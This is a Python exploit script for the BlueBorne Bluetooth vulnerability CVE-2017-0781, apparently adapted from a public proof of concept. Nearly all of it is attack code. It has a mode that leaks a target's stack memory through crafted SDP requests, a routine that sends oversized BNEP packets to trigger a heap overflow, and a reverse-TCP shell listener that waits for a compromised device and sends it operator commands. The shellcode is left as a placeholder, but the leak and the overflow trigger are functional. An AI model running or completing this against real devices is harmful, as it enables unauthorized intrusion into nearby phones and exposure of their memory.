#Original code credits to ojasookert - I'm assuming GPL here. Link is https://github.com/ojasookert/CVE-2017-0781/blob/master/CVE-2017-0781.py
from pwn import *
import bluetooth
import socket
import sys

if not 'TARGET' in args or not 'LHOST' in args:
    log.info('Usage: python CVE-2017-0781.py TARGET=XX:XX:XX:XX:XX:XX LHOST=XXX.XXX.X.XXX')
    print('Optional arguments:')
    #log.info('LHOST=XXX.XX.X.XXX | Determines host for reverse TCP shell to connect back to')
    log.info('LPORT=XXXX         | Determines port to use for reverse TCP shell. Default: 6231 (Shell will open automatically, you will not need this)')
    exit()
if 'DBGHandlers' in sys.argv:
    DBGHandlers=True
else:
    DBGHandlers=False
target = args['TARGET']
lhost = args['LHOST']
bind=False
reverse=True
count = 30 # Amount of packets to send
if 'LPORT' in args:
    lport=int(args['LPORT'])
else:
    lport=6231
log.info('Engaging host '+target)
if bind==True:
    log.info('Shell type: Bind TCP')
    log.info('Port number: '+str(lport))
elif bind==False and reverse==True:
    log.info('Shell type: Reverse TCP')
    log.info('Port number: '+str(lport))
    log.info('Connection server: '+lhost)
def RevHandler(lhost,lport):
    #THIS IS JUST A PROOF OF CONCEPT - ADD REAL CODE
    s=socket.socket()
    s.bind(("0.0.0.0",lport))
    s.listen(5)
    c,a = s.accept()
    ping=c.recv(64)
    if not ping == "":
        log.success('Connection from comprimised device established')
        command=raw_input("shellfish@blueborne:~# ")
        c.send(command)
        out=c.recv(99999)
        print str(out)
def BindHandler():
    log.failure("Not implemented")
    exit()
def Handlers(bind):	
    if bind==True:
        BindHandler()
    elif bind==False:# and reverse==True:
        RevHandler(lhost,lport)
if DBGHandlers == True:
    Handlers(bind)
if 'Disclosure' in sys.argv:
    service_long = 0x0100
    service_short = 0x0001
    mtu = 50
    n = 30

    def packet(service, continuation_state):
        pkt = '\x02\x00\x00'
        pkt += p16(7 + len(continuation_state))
        pkt += '\x35\x03\x19'
        pkt += p16(service)
        pkt += '\x01\x00'
        pkt += continuation_state
        return pkt

    p = log.progress('Exploit')
    p.status('Creating L2CAP socket')

    sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
    bluetooth.set_l2cap_mtu(sock, mtu)
    context.endian = 'big'

    p.status('Connecting to target')
    sock.connect((target, 1))

    p.status('Sending packet 0')
    sock.send(packet(service_long, '\x00'))
    data = sock.recv(mtu)

    if data[-3] != '\x02':
        log.error('Invalid continuation state received.')

    stack = ''

    for i in range(1, n):
        p.status('Sending packet %d' % i)
        sock.send(packet(service_short, data[-3:]))
        data = sock.recv(mtu)
        stack += data[9:-3]

    sock.close()

    p.success('Done')

    print hexdump(stack)
    sys.exit(0)

port = 0xf # BT_PSM_BNEP
context.arch = 'arm'
BNEP_FRAME_CONTROL = 0x01
BNEP_SETUP_CONNECTION_REQUEST_MSG = 0x01

def set_bnep_header_extension_bit(bnep_header_type):
    """
    If the extension flag is equal to 0x1 then
    one or more extension headers follows the BNEP
    header; If extension flag is equal to 0x0 then the
    BNEP payload follows the BNEP header.
    """
    return bnep_header_type | 128

def bnep_control_packet(control_type, control_packet):
    return p8(control_type) + control_packet

def packet(overflow):
    pkt = ''
    pkt += p8(set_bnep_header_extension_bit(BNEP_FRAME_CONTROL))
    pkt += bnep_control_packet(BNEP_SETUP_CONNECTION_REQUEST_MSG, '\x00' + overflow)
    return pkt
#ADD SHELLCODE HERE
bad_packet = packet('AAAABBBB')

log.info('Connecting...')
sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
bluetooth.set_l2cap_mtu(sock, 1500)
sock.connect((target, port))

log.info('Sending BNEP packets...')
for i in range(count):
    sock.send(bad_packet)

log.success('Done.')
sock.close()
Handlers(bind)
